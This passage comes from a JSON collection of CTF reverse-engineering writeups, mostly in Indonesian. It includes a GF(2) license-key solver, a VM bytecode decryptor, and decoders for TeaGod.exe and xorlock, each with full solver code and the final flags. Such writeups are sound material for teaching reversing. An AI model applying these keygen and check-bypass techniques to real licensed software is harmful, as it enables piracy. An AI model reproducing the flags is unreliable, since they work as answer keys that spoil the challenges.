(0x31 + 0x11 * j) & 0xFF\r\n    add_key = (0x0B * j) & 0xFF\r\n    return (rol8(c ^ xor_key, j % 5) + add_key) & 0xFF\r\n\r\n\r\ndef round_transform(state: list[int], r: int) -> list[int]:\r\n    \"\"\"One of the four affine validator rounds.\"\"\"\r\n    out = [0] * N\r\n    for i in range(N):\r\n        v = state[i] ^ state[(i + 7) % N]\r\n        v ^= (i + 0x1D * r) & 0xFF\r\n        v ^= ROUND_KEYS[r][i % 4]\r\n        out[i] = rol8(v, (i + r) % 7)\r\n    return out\r\n\r\n\r\ndef pipeline(state: list[int]) -> list[int]:\r\n    state = list(state)\r\n    for r in range(4):\r\n        state = round_transform(state, r)\r\n    return state\r\n\r\n\r\ndef pack_le_bits(bs: list[int] | bytes) -> int:\r\n    \"\"\"Pack byte/bit index i*8+j into bit position i*8+j of an integer.\"\"\"\r\n    out = 0\r\n    for i, b in enumerate(bs):\r\n        out |= int(b) << (8 * i)\r\n    return out\r\n\r\n\r\ndef build_affine_system() -> tuple[list[list[int]], int]:\r\n    \"\"\"Build A*x=b for the 192 input bits of the 4-round pipeline.\"\"\"\r\n    zero = pipeline([0] * N)\r\n    zero_int = pack_le_bits(zero)\r\n    rhs_int = pack_le_bits(TARGET) ^ zero_int\r\n\r\n    # Each column is the output delta caused by toggling one input bit.\r\n    columns: list[int] = []\r\n    for bit in range(N * 8):\r\n        state = [0] * N\r\n        state[bit // 8] = 1 << (bit % 8)\r\n        out = pipeline(state)\r\n        delta = [a ^ b for a, b in zip(out, zero)]\r\n        columns.append(pack_le_bits(delta))\r\n\r\n    rows: list[list[int]] = []\r\n    for out_bit in range(N * 8):\r\n        coeff = 0\r\n        for var, column in enumerate(columns):\r\n            if (column >> out_bit) & 1:\r\n                coeff |= 1 << var\r\n        rows.append([coeff, (rhs_int >> out_bit) & 1])\r\n    return rows, N * 8\r\n\r\n\r\ndef rref_gf2(rows: list[list[int]], nvars: int):\r\n    \"\"\"Reduced row-echelon form over GF(2).\"\"\"\r\n    row = 0\r\n    pivots: list[int] = []\r\n\r\n    for col in range(nvars):\r\n        pivot = None\r\n        for rr in range(row, len(rows)):\r\n            if (rows[rr][0] >> col) & 1:\r\n                pivot = rr\r\n                break\r\n        if pivot is None:\r\n            continue\r\n\r\n        rows[row], rows[pivot] = rows[pivot], rows[row]\r\n        pcoeff, prhs = rows[row]\r\n\r\n        for rr in range(len(rows)):\r\n            if rr != row and ((rows[rr][0] >> col) & 1):\r\n                rows[rr][0] ^= pcoeff\r\n                rows[rr][1] ^= prhs\r\n\r\n        pivots.append(col)\r\n        row += 1\r\n\r\n    for coeff, rhs in rows:\r\n        if coeff == 0 and rhs:\r\n            raise RuntimeError(\"validator equations are inconsistent\")\r\n\r\n    return rows, pivots\r\n\r\n\r\ndef solve_license() -> str:\r\n    rows, nvars = build_affine_system()\r\n    rows, pivots = rref_gf2(rows, nvars)\r\n    pivot_set = set(pivots)\r\n    free = [i for i in range(nvars) if i not in pivot_set]\r\n\r\n    # The recovered system has rank 178 -> 14 free bits -> only 16384 states.\r\n    if len(free) != 14:\r\n        raise RuntimeError(f\"unexpected nullity: {len(free)}\")\r\n\r\n    pivot_rows = {pivots[i]: rows[i] for i in range(len(pivots))}\r\n\r\n    particular = 0\r\n    for p, (_, rhs) in pivot_rows.items():\r\n        if rhs:\r\n            particular |= 1 << p\r\n\r\n    basis: list[int] = []\r\n    for f in free:\r\n        v = 1 << f\r\n        for p, (coeff, _) in pivot_rows.items():\r\n            if (coeff >> f) & 1:\r\n                v |= 1 << p\r\n        basis.append(v)\r\n\r\n    # Allowed pre-transform byte -> original ASCII character for each position.\r\n    domains: list[dict[int, int]] = []\r\n    for j in range(N):\r\n        domains.append({pre_transform_byte(c, j): c for c in HEX_CHARS})\r\n\r\n    matches: list[str] = []\r\n    for mask in range(1 << len(free)):\r\n        x = particular\r\n        for k, basis_vec in enumerate(basis):\r\n            if (mask >> k) & 1:\r\n                x ^= basis_vec\r\n\r\n        transformed = [(x >> (8 * i)) & 0xFF for i in range(N)]\r\n        if not all(transformed[j] in domains[j] for j in range(N)):\r\n            continue\r\n\r\n        permuted_chars = [domains[j][transformed[j]] for j in range(N)]\r\n        raw = [0] * N\r\n        for j, c in enumerate(permuted_chars):\r\n            raw[PERM[j]] = c\r\n\r\n        raw_text = bytes(raw).decode(\"ascii\")\r\n        license_text = \"-\".join(raw_text[i:i + 4] for i in range(0, N, 4))\r\n        matches.append(license_text)\r\n\r\n    if len(matches) != 1:\r\n        raise RuntimeError(f\"expected one valid license, got {len(matches)}\")\r\n\r\n    return matches[0]\r\n\r\n\r\ndef validate_license_locally(license_text: str) -> bool:\r\n    \"\"\"Pure-Python reproduction of the binary's core validation path.\"\"\"\r\n    if len(license_text) != 29:\r\n        return False\r\n    if any(license_text[i] != \"-\" for i in (4, 9, 14, 19, 24)):\r\n        return False\r\n\r\n    raw = license_text.replace(\"-\", \"\")\r\n    if len(raw) != 24 or any(ord(c) not in HEX_CHARS for c in raw):\r\n        return False\r\n\r\n    permuted = [ord(raw[idx]) for idx in PERM]\r\n    state = [pre_transform_byte(c, j) for j, c in enumerate(permuted)]\r\n    return bytes(pipeline(state)) == TARGET\r\n\r\n\r\ndef decode_flag() -> str:\r\n    out = bytearray()\r\n    cl = 0x7E\r\n\r\n    for j in range(0, len(FLAG_BLOB), 2):\r\n        out.append(FLAG_BLOB[j] ^ ((cl - 0x0D) & 0xFF))\r\n        if j + 1 < len(FLAG_BLOB):\r\n            out.append(FLAG_BLOB[j + 1] ^ cl)\r\n        cl = (cl + 0x1A) & 0xFF\r\n\r\n    return out.decode(\"ascii\")\r\n\r\n\r\ndef main() -> None:\r\n    license_text = solve_license()\r\n    flag = decode_flag()\r\n\r\n    assert validate_license_locally(license_text)\r\n\r\n    print(f\"[+] license: {license_text}\")\r\n    print(f\"[+] decoded success flag: {flag}\")\r\n\r\n    binary = os.path.join(os.path.dirname(__file__), \"license_v2\")\r\n    if os.path.isfile(binary) and os.access(binary, os.X_OK):\r\n        proc = subprocess.run(\r\n            [binary, license_text],\r\n            check=False,\r\n            stdout=subprocess.PIPE,\r\n            stderr=subprocess.PIPE,\r\n            text=True,\r\n        )\r\n        binary_output = proc.stdout.strip()\r\n        print(f\"[+] binary output: {binary_output}\")\r\n        print(f\"[+] binary exit code: {proc.returncode}\")\r\n        if proc.returncode != 0 or binary_output != flag:\r\n            raise RuntimeError(\"binary verification failed\")\r\n\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{license_pipeline_rebuilt}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-rev-makereverse",
    "title": "Writeup CTF Reverse Engineering — Because There is no one Make Reverse So I Create This Chal",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge Writeup CTF Reverse Engineering — Because There is no one Make Reverse So I Create This Chal",
    "problemDescription": "",
    "tools": [],
    "analysis": "Pada fungsi `main`, program mencetak prompt:\n\n```text\nflag>\n```\n\nKemudian membaca input menggunakan `fgets`. Program juga membersihkan newline menggunakan `strcspn`.\n\nSetelah input dibaca, program melakukan alokasi buffer sebesar `0x2c4` byte:\n\n```asm\nmovz w0, 0x2c4\nbl sym.imp.malloc\n```\n\nBuffer ini nantinya dipakai sebagai hasil decrypt payload atau bytecode VM.\n\nProgram kemudian memanggil fungsi:\n\n```asm\nbl sym.func.100000ab0\n```\n\nFungsi ini menghasilkan key dengan cara XOR dua konstanta 16 byte dari section `__const`.\n\nKey hasil XOR:\n\n```text\n0x2580f501\n0xd194e025\n0x9f48ceeb\n0x05488ea6\n```\n\nSetelah bytecode berhasil didecrypt dan hash valid, program memanggil:\n\n```asm\nsym.func.1000008dc\n```\n\nFungsi ini adalah VM interpreter yang menerima:\n\n```text\narg1 = bytecode hasil decrypt\narg2 = input user\narg3 = panjang input\n```\n\nVM memiliki beberapa opcode penting:\n\n```text\n0xcd = cek panjang input\n0x97 = pilih index input\n0x86 = load karakter input pada index tertentu\n0x15 = XOR immediate\n0x18 = ADD immediate\n0xe5 = SUB immediate\n0x74 = ROL immediate\n0x8f = compare accumulator dengan immediate\n0x5b = jump\n0x5a = halt / success\n```\n\nOpcode-opcode tersebut terlihat dari percabangan pada fungsi VM, di mana VM membaca bytecode, memodifikasi accumulator, lalu membandingkan hasilnya.\n\nKarena setiap karakter flag divalidasi secara independen dengan operasi sederhana seperti XOR, ADD, SUB, dan ROL, kita bisa menulis solver untuk meniru VM lalu mencari karakter printable yang memenuhi setiap constraint.",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "**Judul:** Because There is no one Make Reverse So I Create This Chal\n**Kategori:** Reverse Engineering\n**File:** `chal`\n\nChallenge memberikan sebuah binary bernama `chal`. Setelah dicek menggunakan `file`, binary tersebut terdeteksi sebagai Mach-O 64-bit arm64 executable, sehingga tidak bisa langsung dijalankan di Linux x86_64 dan menghasilkan `exec format error`."
      },
      {
        "title": "Recon Awal",
        "content": "Pertama dilakukan pengecekan file dan string:\n\n```bash\nfile chal\nstrings chal\n```\n\nOutput penting dari `strings`:\n\n```text\nflag>\nNo input.\nNope.\nPayload error.\nCorrect!\n```\n\nString tersebut menunjukkan bahwa program meminta input flag, lalu memberikan output `Correct!` jika input benar.\n\nKarena binary tidak bisa dijalankan langsung di environment Linux, analisis dilakukan menggunakan `radare2`.\n\n```bash\nr2 -A chal\n```\n\nFungsi yang ditemukan:\n\n```text\nmain\nsym.func.1000008dc\nsym.func.100000ab0\n```"
      },
      {
        "title": "Dekripsi Bytecode",
        "content": "Di dalam `main`, terdapat proses decrypt data dari section `__const` pada alamat `0x100000b98` sepanjang `0x2c4` byte. Proses decrypt menggunakan algoritma mirip TEA/XTEA untuk menghasilkan keystream, lalu hasilnya di-XOR dengan data terenkripsi.\n\nSetelah decrypt, program menghitung hash terhadap hasil bytecode:\n\n```asm\nh = (h ^ byte) * 0x01000193\n```\n\nNilai awal hash:\n\n```text\n0x811c9dc5\n```\n\nNilai target:\n\n```text\n0x4b9fb9f7\n```\n\nJika hash tidak cocok, program masuk ke jalur `Payload error` atau `Nope`. Jika cocok, program lanjut ke VM validator.\n\nAwalnya implementasi decrypt sempat salah karena `sum += delta` ditambahkan dua kali per round. Setelah disesuaikan dengan assembly, ternyata `sum` hanya naik satu kali per round. Setelah diperbaiki, hash bytecode menjadi benar:\n\n```text\n0x4b9fb9f7\n```"
      },
      {
        "title": "Solver",
        "content": "Solver berikut melakukan:\n\n1. Ekstrak data terenkripsi dari section `__const`.\n2. Ekstrak dua konstanta key.\n3. XOR dua konstanta untuk mendapatkan key asli.\n4. Generate keystream TEA-like.\n5. XOR ciphertext dengan keystream untuk mendapatkan bytecode VM.\n6. Validasi hash bytecode.\n7. Interpret bytecode dan recover flag.\n\n```python\n#!/usr/bin/env python3\nimport subprocess\nimport struct\nimport sys\n\nBIN = sys.argv[1] if len(sys.argv) > 1 else \"chal\"\nMASK = 0xffffffff\n\ndef r2p8(addr, size):\n    out = subprocess.check_output(\n        [\"r2\", \"-q\", \"-c\", f\"p8 {size} @ {addr}\", \"-c\", \"q\", BIN],\n        text=True\n    )\n    hx = \"\".join(out.split())\n    return bytes.fromhex(hx)\n\ndef u32(x):\n    return x & MASK\n\ndef rol8(x, n):\n    x &= 0xff\n    n &= 7\n    return ((x << n) | (x >> (8 - n))) & 0xff\n\nenc = r2p8(\"0x100000b98\", 0x2c4)\nka = r2p8(\"0x100000e5c\", 0x10)\nkb = r2p8(\"0x100000e6c\", 0x10)\n\nkey = [\n    struct.unpack_from(\"<I\", ka, i)[0] ^ struct.unpack_from(\"<I\", kb, i)[0]\n    for i in range(0, 16, 4)\n]\n\ndef stream_block(block_index):\n    v0 = u32(block_index + 0xafd9e340)\n    v1 = 0x1e403058\n    s = 0\n    delta = 0x9e3779b9\n\n    for _ in range(32):\n        t = u32(((v1 << 4) ^ (v1 >> 5)))\n        t = u32(t + v1)\n        t ^= u32(s + key[s & 3])\n        v0 = u32(v0 + t)\n\n        s = u32(s + delta)\n\n        t = u32(((v0 << 4) ^ (v0 >> 5)))\n        t = u32(t + v0)\n        t ^= u32(s + key[(s >> 11) & 3])\n        v1 = u32(v1 + t)\n\n    return struct.pack(\"<II\", v0, v1)\n\ncode = bytearray()\n\nfor off in range(0, len(enc), 8):\n    ks = stream_block(off >> 3)\n    for a, b in zip(enc[off:off+8], ks):\n        code.append(a ^ b)\n\ncode = bytes(code[:0x2c4])\n\nh = 0x811c9dc5\nfor b in code:\n    h = u32((h ^ b) * 0x01000193)\n\nprint(\"[+] key =\", [hex(x) for x in key])\nprint(\"[+] vm hash =\", hex(h))\n\ndef apply_ops(ch, ops):\n    x = ch & 0xff\n\n    for op, imm in ops:\n        if op == \"xor\":\n            x ^= imm\n        elif op == \"add\":\n            x = (x + imm) & 0xff\n        elif op == \"sub\":\n            x = (x - imm) & 0xff\n        elif op == \"rol\":\n            x = rol8(x, imm)\n        else:\n            raise ValueError(op)\n\n    return x\n\ndef solve_constraints(code):\n    ip = 0\n    fuel = 0x589\n    idx = 0\n    length = None\n    ops = []\n    chars = {}\n\n    while fuel > 0:\n        fuel -= 1\n        old = ip\n        op = code[ip]\n        ip += 1\n\n        if op == 0x5a:\n            break\n\n        elif op == 0xcd:\n            imm = code[ip]\n            ip += 1\n            length = imm\n\n        elif op == 0x97:\n            idx = code[ip]\n            ip += 1\n\n        elif op == 0x86:\n            ops = []\n\n        elif op == 0x15:\n            ops.append((\"xor\", code[ip]))\n            ip += 1\n\n        elif op == 0x18:\n            ops.append((\"add\", code[ip]))\n            ip += 1\n\n        elif op == 0xe5:\n            ops.append((\"sub\", code[ip]))\n            ip += 1\n\n        elif op == 0x74:\n            ops.append((\"rol\", code[ip]))\n            ip += 1\n\n        elif op == 0x8f:\n            target = code[ip]\n            ip += 1\n\n            sols = [\n                c for c in range(32, 127)\n                if apply_ops(c, ops) == target\n            ]\n\n            if not sols:\n                sols = [\n                    c for c in range(256)\n                    if apply_ops(c, ops) == target\n                ]\n\n            if not sols:\n                raise RuntimeError(\n                    f\"no solution at ip={old:x}, idx={idx}, target={target:02x}, ops={ops}\"\n                )\n\n            chars[idx] = sols[0]\n\n        elif op == 0x5b:\n            imm = code[ip]\n            ip = old + imm + 2\n\n        else:\n            raise RuntimeError(f\"unknown opcode {op:02x} at {old:x}\")\n\n    if length is None:\n        length = max(chars) + 1\n\n    flag = bytearray(b\"?\" * length)\n\n    for i, c in chars.items():\n        if i < length:\n            flag[i] = c\n\n    return flag.decode(errors=\"replace\")\n\ndef vm(code, s):\n    s = s.encode()\n    ip = 0\n    fuel = 0x589\n    acc = 0\n    err = 0\n    idx = 0\n\n    while fuel > 0:\n        fuel -= 1\n        old = ip\n        op = code[ip]\n        ip += 1\n\n        if op == 0x5a:\n            return err == 0\n\n        elif op == 0xcd:\n            err |= (len(s) ^ code[ip])\n            ip += 1\n\n        elif op == 0x97:\n            idx = code[ip]\n            ip += 1\n\n        elif op == 0x86:\n            acc = s[idx] if idx < len(s) else 0\n\n        elif op == 0x15:\n            acc ^= code[ip]\n            acc &= 0xff\n            ip += 1\n\n        elif op == 0x18:\n            acc = (acc + code[ip]) & 0xff\n            ip += 1\n\n        elif op == 0xe5:\n            acc = (acc - code[ip]) & 0xff\n            ip += 1\n\n        elif op == 0x74:\n            acc = rol8(acc, code[ip])\n            ip += 1\n\n        elif op == 0x8f:\n            err |= (acc ^ code[ip])\n            ip += 1\n\n        elif op == 0x5b:\n            imm = code[ip]\n            ip = old + imm + 2\n\n        else:\n            return False\n\n    return False\n\nflag = solve_constraints(code)\n\nprint(\"[+] flag =\", flag)\nprint(\"[+] vm ok =\", vm(code, flag))\n```"
      },
      {
        "title": "Eksekusi Solver",
        "content": "Jalankan solver:\n\n```bash\npython3 solve_rev.py ./chal\n```\n\nOutput:\n\n```text\n[+] key = ['0x2580f501', '0xd194e025', '0x9f48ceeb', '0x5488ea6']\n[+] vm hash = 0x4b9fb9f7\n[+] flag = THJCC{1_w0nd3r_h0w_l0n6_41_50lv35_17_>w<}\n[+] vm ok = True\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{1_w0nd3r_h0w_l0n6_41_50lv35_17_>w<}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-rev-teagod",
    "title": "TeaGod.exe",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge TeaGod.exe",
    "problemDescription": "Binary `TeaGod.exe` adalah aplikasi Windows GUI x64. Program menampilkan mekanisme worship/click, lalu membuka window reward. Flag tidak disimpan sebagai string plaintext. Reward dibangun dari tiga blok byte terenkripsi di `.rdata`, lalu didecode saat handler tombol worship pada window `TeaGodNote` dijalankan.\n\nFlag yang didapat:\n\n```\nTHJCC{h77p5://p4s73b1n.com/R58uv133}\n```",
    "tools": [],
    "analysis": "String UTF-16 di `.rdata` menunjukkan aplikasi GUI bertema worship:\n\n```\nTeaGodMain\nTeaGodNote\nTeaGodReward\nTeaGod Worship Protocol\nWorship count:\n茶神降臨 // CLICK TO WORSHIP\nWORSHIP TEA GOD\nREWARD UNLOCKED\nYour reward:\nCOPY\nWORSHIP REQUEST\n```\n\nImport table juga mengarah ke program GUI WinAPI:\n\n```\nCreateWindowExW\nDrawTextW\nFindResourceW\nLoadResource\nLockResource\nSetClipboardData\nSetTimer\nKillTimer\n```\n\nResource PE berisi satu `RCDATA` besar yang ternyata PNG, dipakai untuk gambar pada window worship. Resource ini bukan flag langsung.\n\nClass window yang terdaftar:\n\n- `TeaGodMain` dengan WndProc di `0x1400017a0`\n- `TeaGodNote` dengan WndProc di `0x140001d50`\n- `TeaGodReward` dengan WndProc di `0x1400026c0`\n\nHandler penting ada di `TeaGodNote`:\n\n```asm\n140001dc0: cmp edx, 0x111        ; WM_COMMAND\n140001dcc: movzx eax, r8w\n140001dd0: cmp eax, 0x1001       ; tombol WORSHIP TEA GOD\n140001ddb: inc dword [0x1400080c8]\n```\n\nSetelah tombol note diklik, program masuk ke blok decode reward mulai sekitar `0x140001e74`.\n\nPointer ke data terenkripsi ada di `.rdata`:\n\n```\n0x140005210 -> 0x1400051e6\n0x140005218 -> 0x1400051f2\n0x140005220 -> 0x1400051fe\n```\n\nTiga byte key per blok berada di:\n\n```\n0x140005228: a7 3c d1\n```\n\nTiga blok ciphertext masing-masing 12 byte:\n\n```\n0x1400051e6: a9 a7 b3 e9 cc f0 ed 48 44 17 52 28\n0x1400051f2: 79 9b 50 94 61 9f b1 4b cf 92 d6 97\n0x1400051fe: f6 f4 c6 0a cc bd 04 13 d4 e2 e2 59\n```\n\nDynamic analysis tidak wajib untuk mendapatkan flag. Static analysis sudah cukup karena routine decode reward terlihat jelas di disassembly dan seluruh konstanta berada di `.rdata`.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "```bash\nfile TeaGod.exe\n```\n\nHasil penting:\n\n```\nTeaGod.exe: PE32+ executable for MS Windows 6.00 (GUI), x86-64, 7 sections\n```\n\nSection penting:\n\n```\n.text   VA 0x140001000, raw 0x400\n.rdata  VA 0x140005000, raw 0x4000\n.rsrc   VA 0x14000b000, raw 0x7200\n```"
      },
      {
        "title": "Algoritma Validasi atau Encoding",
        "content": "Program memakai dua tahap decode.\n\nTahap pertama dilakukan per blok 12 byte:\n\n```\ntmp[i] = ((cipher[i] + add_table[i]) & 0xff) ^ block_key\n```\n\n`add_table` dari immediate instruction di loop decode:\n\n```\ne7 e0 d9 d2 cb c4 bd b6 af a8 a1 9a\n```\n\nTahap kedua memakai qword yang ditaruh ke stack:\n\n```asm\nmovabs rax, 0x616e7368655f6368\n```\n\nKarena little-endian, byte key-nya menjadi:\n\n```\nhc_ehsna\n```\n\nIndex key dimulai dari `rax = 1`, lalu naik `+3` setiap byte:\n\n```\nout[i] = tmp[i] ^ b\"hc_ehsna\"[rax & 7]\nrax += 3\n```\n\nAda XOR tambahan dengan satu byte hasil fungsi `0x140002e10`, tetapi byte itu di-XOR dua kali berturut-turut sehingga saling membatalkan dan tidak memengaruhi output akhir.\n\nHasil decode 36 byte langsung menjadi flag."
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve.py` membaca `TeaGod.exe`, mem-parse section PE sederhana, mengambil pointer table dan key dari VA yang ditemukan di disassembly, lalu menjalankan ulang algoritma decode.\n\nScript tidak membutuhkan library eksternal."
      },
      {
        "title": "Cara Menjalankan",
        "content": "```bash\ncd /mnt/data\npython3 solve.py\n```\n\nOutput:\n\n```\nTHJCC{h77p5://p4s73b1n.com/R58uv133}\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nimport struct\r\n\r\nEXE = Path(__file__).with_name(\"TeaGod.exe\")\r\nIMAGE_BASE = 0x140000000\r\n\r\n# Constants recovered from WndProc of TeaGodNote around VA 0x140001e74.\r\nPTR_TABLE_VA = 0x140005210      # 3 x pointers to encrypted 12-byte chunks\r\nBLOCK_KEYS_VA = 0x140005228     # 3 per-block xor bytes\r\nXOR_KEY = b\"hc_ehsna\"           # qword stored at stack+0x78\r\nADD_TABLE = [0xE7, 0xE0, 0xD9, 0xD2, 0xCB, 0xC4,\r\n             0xBD, 0xB6, 0xAF, 0xA8, 0xA1, 0x9A]\r\n\r\n\r\ndef parse_sections(pe: bytes):\r\n    e_lfanew = struct.unpack_from(\"<I\", pe, 0x3C)[0]\r\n    if pe[e_lfanew:e_lfanew + 4] != b\"PE\\0\\0\":\r\n        raise ValueError(\"not a PE file\")\r\n\r\n    coff = e_lfanew + 4\r\n    number_of_sections = struct.unpack_from(\"<H\", pe, coff + 2)[0]\r\n    size_of_optional_header = struct.unpack_from(\"<H\", pe, coff + 16)[0]\r\n    section_table = coff + 20 + size_of_optional_header\r\n\r\n    sections = []\r\n    for i in range(number_of_sections):\r\n        off = section_table + i * 40\r\n        name = pe[off:off + 8].rstrip(b\"\\0\").decode(errors=\"replace\")\r\n        virtual_size, virtual_address, raw_size, raw_ptr = struct.unpack_from(\"<IIII\", pe, off + 8)\r\n        sections.append((name, virtual_address, virtual_size, raw_ptr, raw_size))\r\n    return sections\r\n\r\n\r\ndef va_to_offset(va: int, sections) -> int:\r\n    rva = va - IMAGE_BASE\r\n    for _name, vaddr, vsize, raw_ptr, raw_size in sections:\r\n        size = max(vsize, raw_size)\r\n        if vaddr <= rva < vaddr + size:\r\n            return raw_ptr + (rva - vaddr)\r\n    raise ValueError(f\"VA not mapped: {va:#x}\")\r\n\r\n\r\ndef main():\r\n    pe = EXE.read_bytes()\r\n    sections = parse_sections(pe)\r\n\r\n    ptr_table_off = va_to_offset(PTR_TABLE_VA, sections)\r\n    key_off = va_to_offset(BLOCK_KEYS_VA, sections)\r\n\r\n    chunk_ptrs = [struct.unpack_from(\"<Q\", pe, ptr_table_off + i * 8)[0] for i in range(3)]\r\n    block_keys = pe[key_off:key_off + 3]\r\n\r\n    stage1 = bytearray()\r\n    for block_index, ptr in enumerate(chunk_ptrs):\r\n        enc = pe[va_to_offset(ptr, sections):va_to_offset(ptr, sections) + 12]\r\n        k = block_keys[block_index]\r\n        for i, c in enumerate(enc):\r\n            # Decompiled operation:\r\n            #   tmp[i] = ((enc[i] + ADD_TABLE[i]) & 0xff) ^ block_key\r\n            stage1.append(((c + ADD_TABLE[i]) & 0xFF) ^ k)\r\n\r\n    flag = bytearray()\r\n    rax = 1\r\n    for c in stage1:\r\n        # The binary also XORs one extra byte twice; those two operations cancel.\r\n        flag.append(c ^ XOR_KEY[rax & 7])\r\n        rax += 3\r\n\r\n    print(flag.decode())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{h77p5://p4s73b1n.com/R58uv133}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-rev-xorlocks",
    "title": "Writeup CTF Reverse Engineering — xorlocks",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge Writeup CTF Reverse Engineering — xorlocks",
    "problemDescription": "",
    "tools": [],
    "analysis": "Binary dianalisis menggunakan `radare2`:\n\n```bash\nr2 -A xorlock\n```\n\nFungsi utama ditemukan pada:\n\n```text\nfcn.00201190\n```\n\nDisassembly:\n\n```bash\npdf @ fcn.00201190\n```\n\nPada awal fungsi, program mengecek jumlah argumen:\n\n```asm\ncmp edi, 2\njne 0x20123d\n```\n\nArtinya program harus dijalankan dengan format:\n\n```bash\n./xorlock <password>\n```\n\n---",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "**Judul:** xorlocks\n**Kategori:** Reverse Engineering\n**File:** `xorlock`\n\nChallenge memberikan sebuah binary ELF bernama `xorlock`. Program menerima satu argumen berupa password. Jika password salah, program menampilkan:\n\n```text\naccess denied\n```\n\nJika password benar, program mendekripsi dan mencetak flag.\n\n---"
      },
      {
        "title": "Recon Awal",
        "content": "Pertama, file dijalankan tanpa argumen:\n\n```bash\n./xorlock\n```\n\nOutput:\n\n```text\nusage: ./xorlock <password>\n```\n\nKetika dijalankan dengan input asal:\n\n```bash\n./xorlock test\n```\n\nOutput:\n\n```text\naccess denied\n```\n\nKemudian dicek menggunakan `strings`:\n\n```bash\nstrings xorlock\n```\n\nOutput menarik:\n\n```text\naccess denied\nusage: %s <password>\nHT AVS,chd8\n\\qoOh*>*4\n```\n\nTerdapat beberapa string aneh yang kemungkinan merupakan data terenkripsi atau table validasi.\n\n---"
      },
      {
        "title": "Cek Panjang Password",
        "content": "Program menghitung panjang `argv[1]` secara manual. Setelah loop selesai, nilai `rcx` dibandingkan dengan `0x15`:\n\n```asm\ncmp rcx, 0x15\njne 0x2012ce\n```\n\nKarena loop menghitung sampai null byte, nilai `rcx` sama dengan:\n\n```text\nstrlen(password) + 1\n```\n\nMaka:\n\n```text\nstrlen(password) + 1 = 0x15\nstrlen(password) = 20\n```\n\nJadi password yang benar harus memiliki panjang **20 karakter**.\n\n---"
      },
      {
        "title": "Validasi Password",
        "content": "Bagian validasi password berada pada instruksi berikut:\n\n```asm\nmovzx esi, byte [rax + rdx]\nxor sil, 0x5a\nadd sil, cl\nmovzx edi, byte [rdx + 0x200150]\ncmp sil, dil\njne access_denied\n```\n\nNilai `cl` dimulai dari `0`, lalu bertambah `3` setiap iterasi:\n\n```asm\nadd cl, 3\n```\n\nSehingga rumus validasi untuk setiap karakter adalah:\n\n```text\n((password[i] ^ 0x5a) + 3*i) & 0xff == table[i]\n```\n\nDari rumus tersebut, password bisa dibalik menjadi:\n\n```text\npassword[i] = ((table[i] - 3*i) & 0xff) ^ 0x5a\n```\n\nTable pembanding berada di alamat:\n\n```text\n0x200150\n```\n\ndan panjangnya 20 byte.\n\n---"
      },
      {
        "title": "Dekripsi Output Sukses",
        "content": "Setelah password valid, program tidak langsung menyimpan flag plaintext. Program mendekripsi pesan sukses dari data di `.rodata`.\n\nBagian pentingnya:\n\n```asm\nmov eax, 1\nmov cl, 0x40\n\nlea edx, [rcx - 0xd]\nxor dl, byte [rax + 0x20016f]\nmov byte [rsp + rax - 0x21], dl\n\nmovzx edx, byte [rax + 0x200170]\nxor dl, cl\nmov byte [rsp + rax - 0x20], dl\n\nadd rax, 2\nadd cl, 0x1a\n```\n\nLoop ini membangun output sepanjang 31 byte. Jadi setelah password benar, flag didekripsi menggunakan XOR sederhana dari data yang berada di sekitar alamat `0x200170`.\n\n---"
      },
      {
        "title": "Solver",
        "content": "Solver dibuat untuk:\n\n1. Mengambil table password dari alamat `0x200150`.\n2. Membalik rumus validasi password.\n3. Mengambil data terenkripsi output dari alamat `0x200170`.\n4. Mendekripsi pesan sukses.\n5. Menjalankan binary dengan password hasil recovery.\n\n```python\n#!/usr/bin/env python3\nimport subprocess\nimport sys\n\nBIN = sys.argv[1] if len(sys.argv) > 1 else \"./xorlock\"\n\ndef r2p8(addr, size):\n    out = subprocess.check_output(\n        [\"r2\", \"-q\", \"-c\", f\"p8 {size} @ {addr}\", \"-c\", \"q\", BIN],\n        text=True\n    )\n    return bytes.fromhex(\"\".join(out.split()))\n\n# Table validasi password\ntbl = r2p8(\"0x200150\", 20)\n\npassword = bytes(\n    (((b - (3 * i)) & 0xff) ^ 0x5a)\n    for i, b in enumerate(tbl)\n)\n\nprint(\"[+] password =\", password.decode(errors=\"replace\"))\n\n# Data terenkripsi untuk output sukses\nenc = r2p8(\"0x200170\", 31)\n\nout = []\ncl = 0x40\n\nfor k in range(16):\n    out.append(((cl - 0x0d) & 0xff) ^ enc[2 * k])\n\n    if 1 + 2 * k == 0x1f:\n        break\n\n    out.append(enc[2 * k + 1] ^ cl)\n    cl = (cl + 0x1a) & 0xff\n\nflag = bytes(out)\n\nprint(\"[+] decrypted output =\", flag.decode(errors=\"replace\"))\n```\n\n---"
      },
      {
        "title": "Eksekusi Solver",
        "content": "Jalankan solver:\n\n```bash\npython3 solve_xorlock.py ./xorlock\n```\n\nKemudian password hasil recovery digunakan untuk menjalankan binary:\n\n```bash\nPW=$(python3 solve_xorlock.py ./xorlock | awk -F'= ' '/password/{print $2}')\n./xorlock \"$PW\"\n```\n\nOutput:\n\n```text\nTHJCC{xor_basics_are_not_magic}\n```\n\n---"
      }
    ],
    "terminalOutputs": [],
